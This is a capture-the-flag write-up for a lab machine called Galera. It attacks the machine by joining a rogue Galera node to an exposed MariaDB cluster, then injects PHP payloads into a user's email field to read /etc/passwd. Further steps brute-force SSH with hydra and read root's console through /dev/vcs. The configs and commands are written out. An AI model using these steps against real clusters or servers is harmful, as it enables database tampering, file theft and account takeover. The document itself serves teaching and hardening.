## Introduction / Motivation 

After watching the live streams on Twitch by [CursosDeDesarrollo](https://blog.cursosdedesarrollo.com/) struggling to install a `MariaDB` cluster with `MariaDB Galera Cluster`, I realized that if the Galera port (port `4567`) is not properly secured, a malicious node could be created to modify the cluster's databases. This CTF attempts to reproduce the issue, among other things. Additionally, since I hadn't created any CTF for [HackMyVM](https://hackmyvm.eu), this was the opportunity.

## Intrusion

On port `80`, the website seems to be well protected and we won't achieve anything with brute force.

On port `22` we have SSH and it will be difficult to achieve anything with brute force without having any user.

Port `4567`, if we investigate a little, we will find that it is used by `Galera Cluster`, a system for clustering databases in MariaDB or MySQL. Additionally, the machine is named `Galera`, so we try this route.

More information about **Galera** and how to create a node to connect to the cluster:

- [What is MariaDB Galera Cluster?](https://mariadb.com/kb/en/what-is-mariadb-galera-cluster/)
- [MariaDB Galera Cluster](https://mariadb.com/kb/en/galera-cluster/)

### Malicious Node in the Cluster

The idea is to create a Galera node and attempt to connect it to the Galera cluster node exposed on port `4567`. If `Galera` is configured without security (default configuration), we will be able to connect our node to the cluster, view the databases, and it is even likely that we can modify them.

We will use Docker to create a MariaDB service (attacker) and configure Galera to connect to the server cluster (victim) on port `4567`.

For a Galera node to connect to the cluster, it is important that they use the same version of the library. By viewing the `nmap` report, we can observe that the OS is a **Debian 12 ‚ÄúBookworm‚Äù**. The version of **MariaDB** that comes in the default repositories in `Bookworm` is **10.11.11**, which already includes the Galera Cluster library installed. We create the container with this version.

We use `docker` and `docker compose` for convenience and to avoid affecting other databases on our host, but it could be done with just a Docker container by passing the parameters in the command line when starting the container, or with your own host database.

**docker-compose.yml**

```yaml
services:
  galera-atacante:
    image: mariadb:10.11.11
    container_name: galera-atacante
    network_mode: host  # We use host network to facilitate SST (important!)
    environment:
      - MARIADB_ALLOW_EMPTY_ROOT_PASSWORD=yes
      - MARIADB_ROOT_PASSWORD=
      - WSREP_SST_METHOD=rsync
    volumes:
      - ./conf.d:/etc/mysql/conf.d:ro
```

We also create a folder `conf.d` next to the file `docker-compose.yml` and inside we will create the Galera configuration file.

**conf.d/galera.cnf**

```bash
[galera]
# Activates Galera mode, enabling synchronous replication
wsrep_on=ON

# Path to the Galera provider library (SMM = Shared Memory Messaging)
wsrep_provider=/usr/lib/galera/libgalera_smm.so


# Address of the "bootstrap list": nodes with which to form the cluster
# gcomm:// without addresses would make it wait until an existing node adds it
wsrep_cluster_address=gcomm://192.168.1.188  # IP of the "victim" node or existing nodes

# IP address of this node, used to communicate with the rest of the cluster
wsrep_node_address=192.168.1.181   			# Local IP of the container or host

# Logical name of this node within the cluster (any identifier)
wsrep_node_name=atacante

# Binlog format. ROW is mandatory for Galera, as it replicates by row
binlog_format=ROW

# Default storage engine. InnoDB is the only one compatible with Galera
default_storage_engine=InnoDB

# Auto-increment lock mode:
# 2 = ‚Äúinterleaved‚Äù ‚Äì allows generating concurrent AUTO_INCREMENT values
#     without global locks, better performance in simultaneous writes
innodb_autoinc_lock_mode=2

# State Snapshot Transfer (SST) method for new nodes:
# rsync = data copy via rsync, simple but blocks the source node
wsrep_sst_method=rsync
```

In the Galera configuration, we do not set any name for the cluster; by default, Galera assigns a name to the cluster if the user does not configure it. We use `rsync` in `WSREP_SST_METHOD` because it does not require a user or password to add a node to the cluster.

On the other hand, pay close attention to the IP addresses in `galera.cnf` configured in the parameters `wsrep_cluster_address` and `wsrep_node_address`.

We execute the docker compose ...

```bash
docker compose up -d
```

![Docker compose](/assets/galera/docker-compose.png)

... and check that the container is up ...

```bash
docker ps
```

and we enter the container's database.

```bash
docker exec -it galera-atacante mysql
```

Now inside our local DB, we check that Galera has synchronized by sending the following SQL command.

```sql
SHOW STATUS LIKE 'wsrep_local_state_comment';
```

![Test galera](/assets/galera/test-galera.png)

If `Value` shows `Synced`, it means that our server has been added as a node to the Galera cluster. We can see other Galera parameters with the following SQL command.

```sql
SHOW STATUS LIKE 'wsrep_%';
```

Some interesting parameters are: `wsrep_connected` which appears as `ON`, or `wsrep_cluster_size` where we can see that we are two nodes in the cluster (we are not alone üòÅ !).

We look at the databases we have and see that there is a database we didn't have in our Docker `galeradb`, we enter and see that there is a table `users`.

```sql
show databases;
```

```sql
use galeradb; show tables;
```

![SQL galera](/assets/galera/sql-galera.png)

We see that there is an admin user in the table, but we won't be able to crack the hash of their password, though we can add other users. First, we need to find out what type of hash it is.

```sql
select * from users\G
```

![SQL table users](/assets/galera/table-users.png)

```bash
hashid '$2y$10$BCAQ6VSNOL9TzfE5/dnVmuc9R5PotwClWAHwRdRAt7RM0d9miJRzq'
```

![hash id](/assets/galera/hash-id.png)

We observe that it is with bcrypt, we create a hash for the password `password`.

```bash
python3 -c "import bcrypt; print(bcrypt.hashpw(b'password', bcrypt.gensalt(rounds=10)).decode())"
```

![hash bcrypt](/assets/galera/hash-bcrypt.png)

and we use it to create a new user in our cluster node in Docker.

```sql
INSERT INTO users (username, email, password) VALUES ('lenam','lenam@lenam.com','$2b$10$.9rNY2PmaVl3fan4XsRCEe3IWVAeFGHGFCWx1XFnNg/fBqZwZqXfa');
```

![SQL user lenam](/assets/galera/users-lenam.png)

We go to the website with the login form that appeared on port 80 and try to validate our created user. We manage to enter the `private.php` page.

![SQL user lenam](/assets/galera/private-web.png)

### LFI

On the `private.php` page, we find a form with different buttons that allow us to register messages. If we try XSS or any type of injection, we won't achieve anything (or so I hope as the creator of the machine). We will only succeed if we manipulate the user's `email` field, which we can only do by modifying the database from our attacking `Galera` cluster node.

At the address found through fuzzing `/info.php`, we find the classic `phpInfo();` output where we can observe various important things such as the `disable_functions` parameter and that the `SPL` module is installed on the server.

![SQL user lenam](/assets/galera/php-disable-functions.png)

As can be seen in `disable_functions`, we have practically all functions to achieve RCE disabled, but we can use `include()`, `file_put_contents()`, and all `SPL` functions useful for evading the `disable_functions`.

We re-enter our attacking MariaDB node with Galera and modify our user's email with either of these two payloads:

```sql 
UPDATE users SET email="<?php $f=new SplFileObject('/etc/passwd');while(!$f->eof())echo$f->fgets(); ?>" WHERE username='lenam';
```

or

```sql 
UPDATE users SET email="<?php include('/etc/passwd'); ?>" WHERE username='lenam';
```

We close our user's session if it was started and log back in, post any message, and then click the `View` button, we manage to obtain the `/etc/passwd` file from the server.

![LFI](/assets/galera/lfi.png)

We can observe that in addition to root and the typical OS users, there is also the user `donjuandeaustria`.

### Brute force on the user `donjuandeaustria`

We use hydra to perform brute force on the `ssh` service of port `22` with the user `donjuandeaustria`.

```bash
hydra -l donjuandeaustria -P /usr/share/wordlists/rockyou.txt -f 192.168.1.188 ssh
```

and in a few minutes (on my machine and without adding more threads, 2 or 3 minutes) we obtain the password for `donjuandeaustria`, which is `amorcito`.

We enter the server via SSH with this user and password and obtain the user.txt flag.

```bash
ssh donjuandeaustria@192.168.1.188
```

![User flag](/assets/galera/user-flag.png)

## Privilege Escalation

If we check the groups to which the user `id` belongs, we can observe that it belongs to the `tty` group, and if we check if there is any user who has started a tty `w`, we will see that root has started a tty with bash.

![Info escalada](/assets/galera/escalada-info.png)

By belonging to the `tty` group, we can observe the `tty` console output (what they are seeing) of other users. We only need to check the contents of the file `/dev/vcs{n}` or `/dev/vcsa{n}`.

If we read the contents of the file `/dev/vcs20`, the tty of the `root` user, we obtain the root password.

```bash
cat /dev/vcs20
```

![Shell root](/assets/galera/root-password.png)

We log in as root user with the obtained password and read the root.txt flag.

![root flag](/assets/galera/root-flag.png)

In this lab, the importance of securing the ports or network of the Galera Cluster can be observed, or at least using another SST method that allows validation by certificate or password.
